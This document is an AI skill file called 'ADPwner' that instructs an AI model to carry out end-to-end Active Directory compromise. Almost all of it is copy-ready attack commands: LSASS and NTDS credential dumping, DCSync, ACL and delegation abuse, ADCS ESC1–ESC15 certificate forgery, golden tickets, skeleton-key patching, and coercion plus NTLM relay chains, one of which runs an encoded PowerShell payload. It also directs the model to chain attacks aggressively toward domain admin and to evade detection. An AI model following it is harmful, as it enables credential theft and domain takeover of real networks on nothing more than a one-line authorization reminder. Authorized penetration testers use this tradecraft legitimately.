# SKILL: Active Directory Red Team — ACL Abuse, Delegation, ADCS & Windows Privilege Escalation

## Metadata
- **Skill Name**: ADPwner
- **Author**: rajchowdhury240
- **Reference**: https://rajchowdhury240.github.io/AD/ACL-Abuse
- **Scope**: Authorized red team / pentest / HTB / engagements only

## Description
End-to-end Active Directory exploitation playbook focused on:
- BloodHound-driven ACL edge abuse (every dangerous edge with PoC)
- Kerberos delegation abuse (unconstrained, constrained, RBCD, SPN-less RBCD, S4U2self abuse)
- ADCS ESC1–ESC15 + Shadow Credentials (PKINIT)
- Machine Account Quota, SID History injection, AdminSDHolder
- Windows token privileges (SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeDebug, SeLoadDriver, SeTakeOwnership, SeManageVolume, SeTcb, SeCreateToken)
- Credential loot (DPAPI, PSReadLine console history, clipboard history, LSASS, SAM/SECURITY, Vault, browsers)
- Kerberos ticket attacks (Kerberoast, AS-REP roast, Golden/Silver/Diamond/Sapphire, S4U)
- NTLM relay → AD takeover chains
- Coerced authentication primitives, WSUS/SCCM abuse, EntraID / Azure AD pivots
- Defense evasion, anti-forensics, and OPSEC tradecraft

## Trigger Phrases
`active directory, AD, BloodHound, ACL abuse, GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf, AddKeyCredentialLink, shadow credentials, ADCS, certipy, ESC1, ESC8, RBCD, resource based delegation, unconstrained, constrained delegation, S4U, Kerberoast, ASREP, DCSync, machine account quota, MAQ, SID history, AdminSDHolder, golden ticket, silver ticket, diamond ticket, sapphire ticket, NTLM relay, ntlmrelayx, SeImpersonate, SeBackup, SeRestore, SeDebug, SeLoadDriver, SeTakeOwnership, DPAPI, PSReadLine, LAPS, gMSA, LSASS, secretsdump, mimikatz, rubeus, impacket, bloodyAD, certipy, PetitPotam, coerce, WSUS, SCCM, EntraID, AzureAD`

## Instructions for Claude
1. **Always start with recon**: identify domain, users, groups, computers, GPOs, trusts, ACLs. Feed BloodHound first.
2. **Never blast loud tools** before passive enum. Respect OPSEC unless engagement allows noise.
3. For every edge/path: explain *why* it works, *prereqs*, *exact command*, *post-exploit chain*.
4. Prefer **Linux Impacket / bloodyAD / certipy** from foothold; switch to **Rubeus / SharpHound / PowerView / Whisker** when on Windows.
5. Chain edges aggressively (e.g. GenericWrite → targeted Kerberoast → crack → ForceChangePassword → DCSync).
6. Detect blockers (PKINIT disabled, LDAPS-only, SMB signing, EPA, Channel Binding, Protected Users, ASREP not allowed) and pivot.
7. Treat every new credential/hash/ticket as fresh BloodHound input — re-mark owned and re-query shortest path to DA.
8. When discussing offensive techniques, **always remind the user this is for authorized testing only**.

---

## 1. Recon & BloodHound Ingest

### 1.1 Collection
**Linux (no creds → creds):**
```bash
# Anonymous null bind enum
nxc smb DC01 -u '' -p '' --shares
nxc ldap DC01 -u '' -p ''
rpcclient -U '' -N DC01

# With creds — BloodHound.py
bloodhound-python -u 'user' -p 'pass' -d domain.local -ns 10.0.0.1 -c All --zip
# Stealth (no SMB session enum)
bloodhound-python -u user -p pass -d domain.local -ns DC -c DCOnly,Group,Container

# With Kerberos ticket
KRB5CCNAME=user.ccache bloodhound-python -k -u user -d domain.local -c All --zip --dns-tcp
```

**Windows:**
```powershell
# SharpHound .NET
.\SharpHound.exe -c All --zipfilename loot.zip
# PowerShell collector
. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
# Stealth
.\SharpHound.exe -c DCOnly --excludedcs
```

**ADCS-aware (Certipy):**
```bash
certipy find -u user@domain.local -p pass -dc-ip DC -vulnerable -stdout
certipy find -u user@domain.local -p pass -bloodhound -old-bloodhound  # produce BH JSON
```

### 1.2 Manual Reconnaissance Catalog
When BloodHound is not available or too noisy, run these primitives:

| Technique | Why it matters | Command |
|-----------|----------------|---------|
| LDAP anonymous bind | Query DC without creds via null session | `nxc ldap DC01 -u '' -p ''` |
| SMB null session | Enum users/shares anonymously on legacy DCs | `nxc smb DC01 -u '' -p '' --shares` |
| RID cycling | Dump users without creds via SAMR | `lookupsid.py domain.local/guest@DC01` |
| SPN scanning | Find service accounts for Kerberoasting | `setspn -Q */*` or `GetUserSPNs.py` |
| DNS zone transfer | Full record dump if AXFR allowed | `dig AXFR @DC01 domain.local` |
| Kerberos pre-auth enum | Username validation via error codes | `kerbrute userenum -d domain.local --dc DC01 users.txt` |
| GPP cpassword | Decrypt Groups.xml AES key in SYSVOL | `nxc smb DC -u user -p pass -M gpp_password` |
| LAPS readability | Read local admin passwords | `nxc ldap DC -u user -p pass --laps` |
| ADCS enumeration | Find vulnerable templates | `certipy find -u user -p pass -dc-ip DC -vulnerable` |

### 1.3 Critical Cypher queries (BloodHound CE)
```cypher
// Owned → DA path
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p

// All ACL edges from owned principals
MATCH p=(s {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AddMember|ForceChangePassword|AllExtendedRights|AddKeyCredentialLink|AddSelf|WriteSPN|ReadGMSAPassword|ReadLAPSPassword|SyncLAPSPassword|WriteAccountRestrictions|GPLink]->(t) RETURN p

// Kerberoastable Tier 0
MATCH (u:User {hasspn:true}) WHERE u.admincount=true RETURN u.name

// AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Constrained w/ protocol transition (S4U abuse)
MATCH (c {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate

// RBCD candidates (writeable msDS-AllowedToActOnBehalfOfOtherIdentity via GenericWrite/All on computer)
MATCH p=(s {owned:true})-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(c:Computer) RETURN p

// Shortest path from any owned object to any computer with constrained delegation
MATCH p=shortestPath((o {owned:true})-[*1..]->(c:Computer {trustedtoauth:true})) RETURN p
```

---

## 2. Credential Access

### 2.1 Kerberoasting
Request TGS for SPN accounts; crack RC4/AES offline.
```bash
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request -outputfile krb.hash
hashcat -m 13100 krb.hash wordlist -r rules/OneRuleToRuleThemAll.rule
```

### 2.2 AS-REP Roasting
Accounts with `DONT_REQ_PREAUTH` leak a crackable hash without creds.
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC -outputfile asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt
```

### 2.3 Timeroasting
Abuse NTP authentication to crack computer account hashes.
```bash
timeroast.py -t DC -o ntp.hashes
hashcat -m 31300 ntp.hashes wordlist
```

### 2.4 Group Policy Preferences (GPP) cpassword
Decrypt the public Microsoft AES key from `Groups.xml` in SYSVOL.
```bash
nxc smb DC -u user -p pass -M gpp_password
# Manual: gpp-decrypt from python-gppdecrypt
```

### 2.5 LSASS Dump
```cmd
:: Mimikatz
sekurlsa::logonpasswords
sekurlsa::ekeys
:: nanodump (OPSEC)
nanodump.exe -w lsass.dmp
:: pypykatz offline
pypykatz lsa minidump lsass.dmp
:: comsvcs.dll LOLBin
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\loot\l.dmp full
```

### 2.6 DCSync
Replicate creds via DRSUAPI with `Replicating Directory Changes` rights.
```bash
secretsdump.py domain.local/owned:pass@DC -just-dc
secretsdump.py 'domain.local/owned:pass@DC' -just-dc-user krbtgt
```

### 2.7 DCShadow
Register rogue DC, push malicious replication.
```bash
# Requires DA or DCSync rights + ability to register SPN
dcshadow.py domain.local/owned:pass@DC
```

### 2.8 NTDS.dit extraction
```cmd
:: VSS shadow copy or ntdsutil ifm
ntdsutil "ac i ntds" "ifm" "create full C:\loot\ntds" q q
:: Or via diskshadow + robocopy with SeBackup
```

### 2.9 SAM / SECURITY / SYSTEM hives
```cmd
reg save HKLM\SAM sam.sav
reg save HKLM\SYSTEM sys.sav
reg save HKLM\SECURITY sec.sav
secretsdump.py -sam sam -system sys -security sec LOCAL
```

### 2.10 Credential Manager / DPAPI / Vault
```cmd
vaultcmd /list
vaultcmd /listcreds:"Web Credentials" /all
cmdkey /list
mimikatz # vault::list
mimikatz # vault::cred /patch
mimikatz # sekurlsa::dpapi
```

### 2.11 LSA secrets & cached domain creds
```bash
secretsdump.py -sam sam -system sys -security sec LOCAL
# DCC2 hashes → hashcat -m 2100
```

### 2.12 WDigest downgrade
Force plaintext passwords in LSASS.
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Wait for next logon, then dump LSASS
```

### 2.13 SSP injection
Load `mimilib.dll` into LSASS for credential capture.
```cmd
copy mimilib.dll %SystemRoot%\System32
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
```

### 2.14 Browser / credential file harvest
```bash
SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect
firefox_decrypt.py
```

### 2.15 KeePass / keylogger
```bash
# Extract from KeePass process memory
KeeFarce.exe
KeeThief.exe
```

### 2.16 ProcDump / PPL bypass
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # !processprotect /process:lsass.exe /remove  # disable PPL
```

---

## 3. ACL Edge Abuse Catalog

### 3.1 GenericAll (user/group/computer)
**On user → reset password, AddKeyCredentialLink (shadow creds), targeted Kerberoast**
```bash
# Password reset (Linux)
net rpc password TARGET 'NewP@ss1!' -U 'DOMAIN/owned%pass' -S DC01
bloodyAD -d domain.local -u owned -p pass --host DC01 set password TARGET 'NewP@ss1!'
rpcchangepwd.py domain.local/owned:pass@DC01 -newpass 'NewP@ss1!' -altuser TARGET

# Shadow Credentials (PKINIT must be enabled — ADCS CA present)
certipy shadow auto -u owned@domain.local -p pass -account TARGET
pywhisker -d domain.local -u owned -p pass --target TARGET --action add

# Targeted Kerberoast (set SPN, roast, unset)
targetedKerberoast.py -v -d domain.local -u owned -p pass
```

**On group → AddMember**
```bash
net rpc group addmem 'Domain Admins' owned -U 'DOMAIN/owned%pass' -S DC01
bloodyAD -d domain.local -u owned -p pass --host DC01 add groupMember 'Domain Admins' owned
```

**On computer → RBCD or Shadow Creds**
```bash
# RBCD (preferred — works without password reset, more OPSEC-safe)
addcomputer.py -computer-name 'attacker$' -computer-pass 'Pwn123!' -dc-host DC01 'domain.local/owned:pass'
rbcd.py -delegate-from 'attacker$' -delegate-to 'TARGET$' -dc-ip DC -action write 'domain.local/owned:pass'
getST.py -spn 'cifs/TARGET.domain.local' -impersonate Administrator 'domain.local/attacker$:Pwn123!'
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.domain.local
```

### 3.2 GenericWrite
- On user: write `servicePrincipalName` → targeted Kerberoast; write `msDS-KeyCredentialLink` (if also on writeable attribute) → shadow creds
- On group: cannot AddMember directly (need WriteProperty on `member` — usually included). Try:
```bash
bloodyAD -d domain.local -u owned -p pass --host DC -p set object 'CN=Group,...' member 'CN=owned,...'
```
- On computer: same as GenericAll for RBCD if `msDS-AllowedToActOnBehalfOfOtherIdentity` writeable.

### 3.3 WriteDACL
Grant yourself any right on the target.
```bash
dacledit.py -action write -rights FullControl -principal owned -target TARGET 'domain.local/owned:pass'
# Then exploit as GenericAll
```
**On domain object → DCSync:**
```bash
dacledit.py -action write -rights DCSync -principal owned -target-dn 'DC=domain,DC=local' 'domain.local/owned:pass'
secretsdump.py domain.local/owned:pass@DC -just-dc
```

### 3.4 WriteOwner / Owns
Attacker becomes owner → owner has implicit `WriteDACL`+`ReadControl`.
```bash
bloodyAD -d domain.local -u owned -p pass --host DC set owner TARGET owned
bloodyAD -d domain.local -u owned -p pass --host DC add genericAll TARGET owned
# Now exploit as GenericAll
```
**OwnsRaw / WriteOwnerRaw / OwnsLimitedRights** (BHCE 5.0): same idea, may require WriteDACL chain.

### 3.5 ForceChangePassword
```bash
net rpc password TARGET 'NewP@ss!' -U 'DOMAIN/owned%pass' -S DC
bloodyAD -d domain.local -u owned -p pass --host DC set password TARGET 'NewP@ss!'
rpcchangepwd.py domain.local/owned:pass@DC -newpass 'NewP@ss!' -altuser TARGET
```
**OPSEC:** breaks user; prefer Shadow Creds when possible.

### 3.6 AddMember / AddSelf
```bash
net rpc group addmem 'Privileged Group' owned -U 'DOMAIN/owned%pass'
bloodyAD ... add groupMember 'Privileged Group' owned
# AddSelf → only self
```

### 3.7 AllExtendedRights
Includes `User-Force-Change-Password`, `DS-Replication-Get-Changes` (DCSync prereq) when on domain root.
```bash
secretsdump.py domain.local/owned:pass@DC -just-dc-ntlm
```

### 3.8 AddKeyCredentialLink → Shadow Credentials
**Prereqs:** ADCS or Domain Controllers with PKINIT support (default 2016+ if KDC cert).
```bash
# Linux
certipy shadow auto -u owned@domain.local -p pass -account TARGET
# Manual
certipy shadow add -u owned -p pass -account TARGET
gettgtpkinit.py -cert-pfx out.pfx -pfx-pass '' domain.local/TARGET tgt.ccache
getnthash.py -key <as-rep-key> domain.local/TARGET
```
**Windows:** `Whisker.exe add /target:TARGET$` → `Rubeus.exe asktgt /user:TARGET$ /certificate:... /getcredentials`

### 3.9 WriteSPN
Set SPN → Kerberoast.
```bash
targetedKerberoast.py -v -d domain.local -u owned -p pass
hashcat -m 13100 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

### 3.10 WriteAccountRestrictions
Toggle `userAccountControl` flags: disable preauth → AS-REP roast offline crackable.
```bash
bloodyAD -d domain.local -u owned -p pass --host DC add uac TARGET -f DONT_REQ_PREAUTH
GetNPUsers.py domain.local/ -usersfile users -no-pass
```

### 3.11 ReadLAPSPassword / ReadGMSAPassword / SyncLAPSPassword
```bash
nxc ldap DC -u owned -p pass --laps
nxc ldap DC -u owned -p pass --gmsa
gMSADumper.py -u owned -p pass -d domain.local
# LAPSv2 (encrypted)
nxc ldap DC -u owned -p pass --laps --laps-pwd
```

### 3.12 GPLink / WriteGPLink / GPO control (AddAllowedToAct on OU, GenericAll on GPO)
```bash
pyGPOAbuse.py domain.local/owned:pass -gpo-id <GUID> --user-task --command 'net user attacker P@ss /add ...'
# Or SharpGPOAbuse on Windows
SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author NT_AUTH --Command cmd.exe --Arguments "/c net group ..." --GPOName "Default Domain Policy"
```

### 3.13 AdminSDHolder abuse
If GenericAll on `CN=AdminSDHolder,CN=System,DC=...` → SDProp re-stamps every protected group (DA, EA, etc.) with attacker DACL ~60 min.
```bash
dacledit.py -action write -rights FullControl -principal owned -target-dn 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' 'domain.local/owned:pass'
# Wait for SDProp → DA on attacker
```

### 3.14 DCSync rights (`DS-Replication-Get-Changes` + `-All` + `-In-Filtered-Set`)
```bash
secretsdump.py domain.local/owned:pass@DC -just-dc
secretsdump.py 'domain.local/owned:pass@DC' -just-dc-user krbtgt
nxc smb DC -u owned -p pass --ntds  # uses VSS or DRSUAPI
```

### 3.15 ReadGMSAPassword
Read the managed password blob of a group Managed Service Account.
```bash
gMSADumper.py -u owned -p pass -d domain.local
bloodyAD ... get object 'CN=svc_gmsa,CN=Managed Service Accounts,DC=domain,DC=local' --attr msDS-ManagedPassword
```

### 3.16 SyncLAPSPassword
Some accounts can sync LAPS passwords; if you own one, pull all local admin passwords.


---

## 4. Kerberos Delegation Attacks

### 4.1 Unconstrained Delegation (TRUSTED_FOR_DELEGATION)
Target server stores any TGT → coerce DC to authenticate → capture TGT → DCSync.
```bash
# Identify
nxc ldap DC -u owned -p pass --trusted-for-delegation
# On compromised unconstrained host
.\Rubeus.exe monitor /interval:1 /nowrap
# Coerce DC$ via PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce
PetitPotam.py -u owned -p pass -d domain.local UnconstrainedHost DC
coercer coerce -u owned -p pass -d domain.local -t DC -l UnconstrainedHost
# DC$ TGT lands in Rubeus → s4u or DCSync
```

### 4.2 Constrained Delegation (msDS-AllowedToDelegateTo)
**Without protocol transition** (`TrustedToAuthForDelegation=False`): can only impersonate users that already authenticated to attacker via Kerberos.
**With protocol transition** (S4U2self+S4U2proxy): impersonate any non-Protected user.
```bash
getST.py -spn 'cifs/target.domain.local' -impersonate Administrator domain.local/svc:pass
# Cross-protocol abuse — request alt service
getST.py -spn 'http/target' -altservice 'cifs/target' -impersonate Administrator ...
# 'sensitive=true' or Protected Users → cannot impersonate
```

### 4.3 Resource-Based Constrained Delegation (RBCD)
Need: write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on victim + control of an account with SPN.
```bash
# Add fake computer (uses MachineAccountQuota=10)
addcomputer.py -computer-name 'evil$' -computer-pass 'Pwn1!' -dc-host DC -domain-netbios DOMAIN 'domain.local/owned:pass'
# Set RBCD
rbcd.py -delegate-from 'evil$' -delegate-to 'VICTIM$' -dc-ip DC -action write 'domain.local/owned:pass'
# S4U
getST.py -spn 'cifs/VICTIM.domain.local' -impersonate Administrator 'domain.local/evil$:Pwn1!'
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass VICTIM.domain.local
```

### 4.4 SPN-less RBCD (no MAQ, no machine account)
Use **U2U (User-to-User)** + **S4U2self** to forge usable service ticket without needing SPN on attacker principal.
```bash
# Requires only a user account; bypasses MAQ=0
getST.py -self -impersonate Administrator -altservice 'cifs/VICTIM.domain.local' -u2u 'domain.local/owned:pass'
# Or modern impacket: -no-s4uproxy / -force-forwardable
```
Useful when MAQ=0 blocks `addcomputer` and you only have a user with WriteDACL on victim.

### 4.5 S4U2self Abuse (no delegation flags) — "U2U"
With any account + GenericAll on a computer: request S4U2self to self → forwardable ticket → use as RBCD source even without SPN.
```bash
getST.py -self -altservice 'host/VICTIM' -impersonate Administrator domain.local/owned:pass -u2u
```

### 4.6 KrbRelay / KrbRelayUp (local privesc via RBCD on self)
```cmd
KrbRelayUp.exe full /Domain:domain.local /CreateNewComputerAccount /Verbose
```

### 4.7 Sapphire Ticket / Diamond Ticket
- **Diamond**: modify legitimate TGT PAC (avoids encrypted-ticket-only golden detection).
- **Sapphire**: request TGT via S4U2self+U2U for high-priv account, get real PAC from DC.
```bash
ticketer.py -nthash <krbtgt> -domain-sid S-1-5-21-... -domain domain.local -request -user owned -password pass -dc-ip DC Administrator
# Diamond mode → modify existing
ticketer.py ... -duration 36000 -groups 512,513,518,519,520
```

---

## 5. ADCS Abuse (ESC1–ESC15)

### 5.1 Enumerate
```bash
certipy find -u owned@domain.local -p pass -dc-ip DC -vulnerable -stdout
certipy find -u owned -p pass -dc-ip DC -enabled -text -output certs
```

### 5.2 ESC1 — Enrollee Supplies Subject + Client Auth EKU
```bash
certipy req -u owned@domain.local -p pass -ca CA-NAME -template VulnTemplate -upn Administrator@domain.local -dns DC.domain.local
certipy auth -pfx administrator.pfx -dc-ip DC
```

### 5.3 ESC2 — Any Purpose / SubCA EKU → forge any cert
Same as ESC1 but template has `Any Purpose` or no EKU.

### 5.4 ESC3 — Enrollment Agent
```bash
certipy req -u owned -p pass -ca CA -template EnrollmentAgent
certipy req -u owned -p pass -ca CA -template User -on-behalf-of 'DOMAIN\Administrator' -pfx agent.pfx
```

### 5.5 ESC4 — Vulnerable template ACL
WriteOwner/WriteDACL/GenericAll/GenericWrite on template object.
```bash
certipy template -u owned -p pass -template VulnTemplate -save-old
# certipy auto-modifies template → ESC1 → restore
```

### 5.6 ESC5 — PKI object ACL
GenericAll on CA object, NTAuthCertificates, or Configuration container → forge trusted CA → golden cert.

### 5.7 ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA
Any cert template enrollable → supply SAN → impersonate.
```bash
certipy req -u owned -p pass -ca CA -template User -upn Administrator@domain.local
```

### 5.8 ESC7 — CA ACL (ManageCA / ManageCertificates)
```bash
certipy ca -u owned -p pass -ca CA -add-officer owned
certipy ca -u owned -p pass -ca CA -enable-template SubCA
certipy req -u owned -p pass -ca CA -template SubCA -upn Administrator@domain.local  # fails → issue manually
certipy ca -u owned -p pass -ca CA -issue-request <reqId>
certipy req -u owned -p pass -ca CA -retrieve <reqId>
```

### 5.9 ESC8 — HTTP/S enrollment + NTLM relay → cert
```bash
# Coerce DC$ → relay to /certsrv (HTTP) or /certsrv (HTTPS — needs no EPA)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py -u '' -p '' DC@80/Pipe/lsarpc DC  # unauthenticated on unpatched
# Use returned cert
certipy auth -pfx dc.pfx -dc-ip DC
```

### 5.10 ESC9 — `no-security-extension` (msDS-MappingFlags / StrongCertificateBindingEnforcement=Disabled)
UPN spoofing on cert without SID extension.

### 5.11 ESC10 — Weak certificate mapping (registry: CertificateMappingMethods=0x4)
Same UPN-spoof pattern post-May 2022 patch when admins downgrade.

### 5.12 ESC11 — RPC over IF_ENFORCEENCRYPTICERTREQUEST=0 → relay ICPR
```bash
ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name CA --adcs --template DomainController
```

### 5.13 ESC13 — OID group link on template (issuance policy → group membership)
Enroll cert with OID linked to high-priv group → token has SID.
```bash
certipy req -u owned -p pass -ca CA -template OIDLinked
certipy auth -pfx out.pfx
```

### 5.14 ESC14 — Weak explicit mapping (altSecurityIdentities writeable on victim)
Write `altSecurityIdentities` on TARGET → enroll your cert → auth as TARGET.

### 5.15 ESC15 — EKUwu (CVE-2024-49019) on V1 templates
V1 schema templates allow arbitrary EKU/SAN injection in CSR.
```bash
certipy req -u owned -p pass -ca CA -template WebServer -application-policies 'Client Authentication' -upn Administrator
```

### 5.16 Golden Certificate
Steal CA private key, forge any cert.
```bash
# Export CA cert + key (requires CA admin)
certipy ca -backup -u owned -p pass -ca CA
# Forge cert for any user
certipy forge -ca-pfx ca.pfx -upn Administrator@domain.local
```

---

## 6. Machine Account Quota (MAQ / ms-DS-MachineAccountQuota)

Default = 10. Any authenticated user can join 10 computers → SPN account → RBCD source.
```bash
# Read MAQ
nxc ldap DC -u owned -p pass -M maq
ldapsearch -H ldap://DC -b 'DC=domain,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota

# Add computer (Linux)
addcomputer.py -computer-name 'evil$' -computer-pass 'Pwn1!' -dc-host DC -method LDAPS 'domain.local/owned:pass'
# SAMR (no LDAPS)
addcomputer.py ... -method SAMR
# bloodyAD
bloodyAD -d domain.local -u owned -p pass --host DC add computer evil 'Pwn1!'
```
**MAQ=0 bypass:** SPN-less RBCD via U2U S4U2self (see §4.4) or use any existing controlled user with SPN.

---

## 7. SID History Injection / Trust Abuse

### 7.1 SID History (intra-forest, golden ticket)
Forge TGT with `ExtraSids` → cross-domain DA in parent.
```bash
ticketer.py -nthash <child_krbtgt> -domain-sid S-1-5-21-CHILD -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519,S-1-5-21-PARENT-512 Administrator
```
**Sapphire ticket** with extraSids same idea but legit PAC.

### 7.2 Trust Key (inter-realm TGT)
```bash
secretsdump.py child.parent.local/admin@DC -just-dc-user 'parent$'
ticketer.py -nthash <trust_key> -domain-sid S-1-5-21-CHILD -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519 -spn krbtgt/parent.local Administrator
getST.py -spn cifs/PARENTDC.parent.local -k -no-pass
```

### 7.3 Foreign Group / Foreign Security Principal
Cypher: `MATCH (n:User)-[:MemberOf*1..]->(g:Group) WHERE g.domain<>n.domain RETURN n,g`

### 7.4 Cross-forest Kerberoast
Roast SPNs in trusted forest using credentials from current forest if trusts allow.

### 7.5 AzureAD Connect / PHS sync abuse
MSOL account password → DCSync on-prem.
```bash
# Extract from ADSync DB on Azure AD Connect server
Invoke-ADSyncDBQuery
```

---

## 8. Kerberos Ticket Attacks

### 8.1 Kerberoast (any user with SPN)
```bash
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request
hashcat -m 13100 hash.txt wordlist -r rules/OneRuleToRuleThemAll.rule
# Targeted (write SPN first)
targetedKerberoast.py -v -d domain.local -u owned -p pass
```

### 8.2 AS-REP Roast (DONT_REQ_PREAUTH)
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC
hashcat -m 18200 hash.txt rockyou.txt
```

### 8.3 Golden Ticket (krbtgt hash)
```bash
ticketer.py -nthash <krbtgt> -domain-sid <S-1-5-21-...> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DC.domain.local
```

### 8.4 Silver Ticket (service account hash)
```bash
ticketer.py -nthash <svc_nt> -domain-sid ... -domain domain.local -spn cifs/server.domain.local Administrator
```

### 8.5 Diamond / Sapphire — see §4.7

### 8.6 Pass-the-Ticket / Pass-the-Hash / OverPass
```bash
getTGT.py domain.local/user@DC -hashes :NTHASH    # PtH→TGT (overpass)
KRB5CCNAME=user.ccache wmiexec.py -k -no-pass HOST
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /run:cmd.exe
```

### 8.7 Skeleton Key
Patch LSASS for universal master password.
```cmd
mimikatz # misc::skeleton
# Then auth with password "mimikatz"
```

### 8.8 PAC validation bypass (noPac)
See §11.

### 8.9 Bronze Bit (CVE-2020-17049)
Bypass S4U2proxy delegation restriction.
```bash
getST.py ... -force-forwardable
```

### 8.10 Kerberos downgrade to RC4
Force weaker etype for offline crack.
```bash
Rubeus.exe kerberoast /tgtdeleg
```

---

## 9. NTLM Relay, Reflection & Coercion → AD Compromise

### 9.1 Coercion primitive matrix
| Bug | Protocol | RPC Interface / UUID | Method | Auth required | Patch |
|---|---|---|---|---|---|
| **PrinterBug / SpoolSample** | MS-RPRN | `12345678-1234-abcd-ef00-0123456789ab` | `RpcRemoteFindFirstPrinterChangeNotification(Ex)` | yes (any user) | spooler disable |
| **PetitPotam** | MS-EFSRPC | `c681d488-d850-11d0-8c52-00c04fd90f7e` / `df1941c5-fe89-4e79-bf10-463657acf44d` | `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, `EfsRpcQueryRecoveryAgents`, `EfsRpcRemoveUsersFromFile`, `EfsRpcAddUsersToFile`, `EfsRpcFileKeyInfo`, `EfsRpcDuplicateEncryptionInfoFile` | originally **unauth** (KB5005413), now any user | KB5005413 patches anon |
| **DFSCoerce** | MS-DFSNM | `4fc742e0-4a10-11cf-8273-00aa004ae673` | `NetrDfsAddStdRoot`, `NetrDfsRemoveStdRoot` | yes | not patched (by design) |
| **ShadowCoerce** | MS-FSRVP | `a8e0653c-2744-4389-a61d-7373df8b2292` | `IsPathShadowCopied`, `IsPathSupported` | yes | KB5015527 |
| **MSEven (CheeseOunce)** | MS-EVEN | EventLog Remoting | `ElfrOpenBELW` | yes | partial |
| **WSPCoerce / WspCoerce** | MS-WSP | Search proto | `ConnectIn` | yes | — |
| **PrivExchange** | EWS Push | HTTP | EWS subscribe push | mailbox user | patched 2019 |
| **AuthCoerce / Coercer (one-shot all)** | many | — | tries all above | — | — |

```bash
# coercer — tries every primitive
coercer coerce -u owned -p pass -d domain.local -t VICTIM -l LISTENER --always-continue
coercer scan -u owned -p pass -d domain.local -t VICTIM     # which are exploitable
coercer fuzz  -u owned -p pass -d domain.local -t VICTIM    # find new

# Per-tool
PetitPotam.py -u owned -p pass -d domain.local LISTENER VICTIM
PetitPotam.py LISTENER VICTIM                               # unauth attempt (pre-patch)
dfscoerce.py -u owned -p pass -d domain.local LISTENER DC
printerbug.py 'domain.local/owned:pass'@DC LISTENER
SpoolSample.exe DC LISTENER                                  # Windows
shadowcoerce.py -u owned -p pass -d domain.local LISTENER VICTIM
```

### 9.2 Relay target playbook
```bash
# (a) LDAPS → RBCD on relayed computer
ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user owned --no-smb-server
# (b) LDAP → add computer / shadow credentials on victim
ntlmrelayx.py -t ldap://DC --add-computer evil --shadow-credentials --shadow-target VICTIM$
# (c) HTTP/HTTPS → ADCS web enrollment (ESC8)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController
ntlmrelayx.py -t https://CA/certsrv/certfnsh.asp --adcs --template DomainController
# (d) RPC → ADCS ICPR (ESC11)
ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name 'CA-NAME' --adcs --template DomainController
# (e) SMB (signing not required) → cmd
ntlmrelayx.py -tf smb_no_signing.txt -smb2support -c 'powershell -enc ...'
# (f) MSSQL → SOCKS / xp_cmdshell
ntlmrelayx.py -t mssql://SQL --no-smb-server -socks
# (g) IMAP / SMTP / EWS / WinRM
ntlmrelayx.py -t imap://mail -socks
# (h) Multi-relay (--multirelay) and SOCKS pivot
ntlmrelayx.py -tf targets.txt -socks -smb2support
proxychains psexec.py 'domain.local/RELAYED@target' -no-pass
```

### 9.3 Kerberos relay (krbrelayx)
```bash
# Requires unconstrained delegation OR DNS spoofing of attacker SPN
krbrelayx.py --target ldap://DC -aesKey <hex> --delegate-access --escalate-user owned
addspn.py -u 'domain.local\owned' -p pass -s host/attacker DC
dnstool.py -u 'domain.local\owned' -p pass --record attacker --action add --data ATTACKER_IP DC
```

### 9.4 NTLM Reflection (CVE-2025-33073) — "SMB → SMB to self"
Reflect coerced SMB auth back to **the same machine** over SMB → bypasses MIC + most relay defenses; gives SYSTEM on coerced host.
```bash
# Patched May 2025 — works on unpatched servers
ntlmrelayx.py -t smb://VICTIM -smb2support --no-smb-server -socks
PetitPotam.py -u low -p pass ATTACKER VICTIM       # attacker = relay host on same subnet
# Or use the MS-DFSNM/EFSRPC primitive that allows null/different SPN → reflects
```
